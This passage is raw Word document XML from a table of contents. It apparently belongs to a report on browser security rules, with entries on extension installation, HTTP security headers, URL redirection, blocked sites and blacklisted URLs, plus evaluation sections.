          </w:rPr>
          <w:t>24</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="06B14B98" w14:textId="57816C5D" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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16" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>4.3</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Rule 3: Extension installation/uninstallation.</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_Toc523071516 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>25</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5AADC1A3" w14:textId="1A99C96E" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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17" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>4.4</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Rule 4: HTTP response header security options.</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_Toc523071517 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>25</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="56EA65A0" w14:textId="12A3EE11" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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18" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>4.5</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Rule 5: URL redirection.</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_Toc523071518 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>26</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="79499C0A" w14:textId="4A25CDCF" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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19" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>4.6</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Rule 6: Block access to websites.</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_Toc523071519 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>26</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="17F42193" w14:textId="27DFCEEB" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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20" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>4.7</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Rule 7: Form submit requests.</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_Toc523071520 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>27</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0BB8B449" w14:textId="3600C5D2" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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21" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>4.8</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Rule 8: User’s CPU information.</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_Toc523071521 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>27</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="47E90A9E" w14:textId="568BFE8C" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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22" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>4.9</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Rule 9: User’s number of displays.</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_Toc523071522 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>28</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="52492EC8" w14:textId="7F233C3F" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071523" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>4.10</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>Rule 10: User’s sessions information.</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_Toc523071523 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>28</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5C949143" w14:textId="42AD5EF4" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="720"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071524" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>4.11</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Use of blacklisted URLs.</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_Toc523071524 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>28</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4A9592AD" w14:textId="6A61A7B0" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="480"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:caps w:val="0"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071525" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>5.</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:caps w:val="0"/>
            <w:noProof/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:lang w:bidi="he-IL"/>
          </w:rPr>
          <w:t>EVALUATION</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071525 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>31</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6728E0CB" w14:textId="2A096A09" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">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26" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>5.1</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Rules and Testing</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_Toc523071526 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>31</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2644C5CE" w14:textId="2E80C691" w:rsidR="00642218" w:rsidRPr="00642218" w:rsidRDefault="00683412">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="480"/>
          <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc523071527" w:history="1">
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>5.2</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Recommendation</w:t>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc523071527 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00642218" w:rsidRPr="00642218">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
